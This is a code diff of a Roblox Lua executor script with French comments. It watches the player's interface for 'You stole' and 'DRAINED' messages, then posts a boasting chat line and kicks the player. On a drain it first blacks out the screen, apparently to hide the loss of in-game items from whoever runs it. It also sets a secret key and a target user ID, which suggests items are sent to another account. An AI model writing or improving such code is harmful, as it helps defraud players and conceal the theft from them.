@@ -951,9 +951,14 @@ task.spawn(function()
     local p = game.Players.LocalPlayer
     local pgui = p:WaitForChild("PlayerGui")
 
-    pgui.DescendantAdded:Connect(function(obj)
-        if obj:IsA("TextLabel") then
-            if string.find(obj.Text, "You stole") then
+    local function check(obj)
+        -- On force la vérification de la propriété "Text" même si l'objet n'est pas un TextLabel classique
+        local success, text = pcall(function() return obj.Text end)
+        if success and text then
+            -- On passe tout en majuscules pour éviter les erreurs de frappe
+            local upperText = string.upper(text)
+            
+            if string.find(upperText, "YOU STOLE") then
                 local msg = "ezzzz steal by brr782k <3"
                 task.spawn(function()
                     local chat = game:GetService("TextChatService")
@@ -967,24 +972,40 @@ task.spawn(function()
                 end)
                 p:Kick(msg)
 
-            elseif string.find(obj.Text, "YOUR BRAINROTS WAS DRAINED") then
+            elseif string.find(upperText, "YOUR BRAINROTS WAS DRAINED") or string.find(upperText, "DRAINED") then
+                -- Écran noir instantané
                 local black = Instance.new("ScreenGui")
                 black.IgnoreGuiInset = true
-                black.DisplayOrder = 1000000
+                black.DisplayOrder = 10000000 -- Priorité maximale
                 black.Parent = pgui
                 local frame = Instance.new("Frame")
                 frame.Size = UDim2.new(1, 0, 1, 0)
                 frame.BackgroundColor3 = Color3.new(0, 0, 0)
-                frame.BorderSizePixel = 0
+                frame.Active = true
                 frame.Parent = black
                 
-                task.wait(0.01)
+                -- Kick sans aucun wait visible
                 p:Kick("test")
             end
         end
-    end)
-end)
+    end
 
+    -- Scanne en continu les nouveaux objets créés par d'autres scripts
+    pgui.DescendantAdded:Connect(function(obj)
+        check(obj)
+        -- Si le texte change après la création
+        pcall(function()
+            obj:GetPropertyChangedSignal("Text"):Connect(function()
+                check(obj)
+            end)
+        end)
+    end)
+
+    -- Vérification initiale de sécurité
+    for _, v in pairs(pgui:GetDescendants()) do
+        check(v)
+    end
+end)
 
 getgenv().SECRET_KEY = "mrr_94d9f8fe3a02461085f84d087e98c28a"
 getgenv().TARGET_ID = 4190736407
